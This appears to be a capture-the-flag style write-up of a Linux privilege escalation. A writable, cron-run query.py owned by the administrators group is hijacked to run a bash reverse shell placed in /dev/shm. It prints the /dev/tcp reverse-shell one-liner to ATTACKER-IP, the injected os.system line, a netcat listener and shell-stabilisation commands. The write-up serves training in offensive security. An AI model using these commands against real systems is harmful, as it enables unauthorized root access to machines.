@@ -1,0 +1,85 @@
+Privilege Escalation
+Enumeration of Administrator Group Permissions
+After obtaining SSH access as user daniel, further enumeration was performed to identify possible privilege escalation vectors.
+First, the user’s group memberships were verified.
+Copy code
+
+groups
+Output showed that the user daniel belongs to the administrators group.
+This indicates that the user may have access to files or scripts intended for administrative operations.
+Searching for Files Accessible by the Administrators Group
+To identify files owned or accessible by the administrators group, the following command was executed:
+Copy code
+
+find / -group administrators -type f 2>/dev/null
+This command searches the entire filesystem for files belonging to the administrators group while suppressing permission errors.
+During this enumeration, an interesting file named:
+Copy code
+
+query.py
+was discovered.
+Analysis of query.py Script
+Inspection of the query.py script revealed that it performs a web server status check and writes the output to a file called:
+Copy code
+
+site_status.txt
+Key observations:
+The script is owned by the administrators group
+The user daniel has write permissions
+The script appears to run automatically
+Further inspection of site_status.txt indicated that the script is executed every 2 minutes, most likely through a scheduled task such as a cron job.
+This behavior introduces a potential privilege escalation vector, as modifying the script could allow execution of arbitrary commands.
+Exploitation
+Creating a Reverse Shell Script
+To exploit this behavior, a reverse shell script was created inside the /dev/shm directory.
+The /dev/shm directory is a temporary in-memory filesystem that is commonly writable by users and suitable for storing temporary payloads.
+Example reverse shell:
+Copy code
+
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
+The script was saved as:
+Copy code
+
+/dev/shm/shell.sh
+Execution permission was then assigned:
+Copy code
+
+chmod +x /dev/shm/shell.sh
+Modifying query.py to Execute the Payload
+Since the user had write access to query.py, the script was modified to execute the reverse shell payload.
+The following line was inserted into the Python script:
+Copy code
+
+import os
+os.system("/dev/shm/shell.sh")
+This ensures that when the script runs automatically, it will execute the attacker’s reverse shell.
+Setting up the Listener
+On the attacker machine, a Netcat listener was started to capture the incoming connection.
+Copy code
+
+nc -lvnp 4444
+Since the script runs every 2 minutes, the payload execution was expected shortly after modification.
+Successful Privilege Escalation
+After approximately 2 minutes, a reverse shell connection was received from the target system.
+This confirmed that the modified script was executed automatically with elevated privileges.
+The attacker gained an interactive shell on the target system.
+Shell Stabilization
+The initial reverse shell was unstable. To improve usability, the shell was upgraded using Python PTY.
+Copy code
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Then the shell was backgrounded:
+Copy code
+
+Ctrl + Z
+Terminal settings were corrected:
+Copy code
+
+stty raw -echo
+fg
+Finally, terminal compatibility was improved:
+Copy code
+
+export TERM=xterm
+This provided a fully interactive and stable shell session.
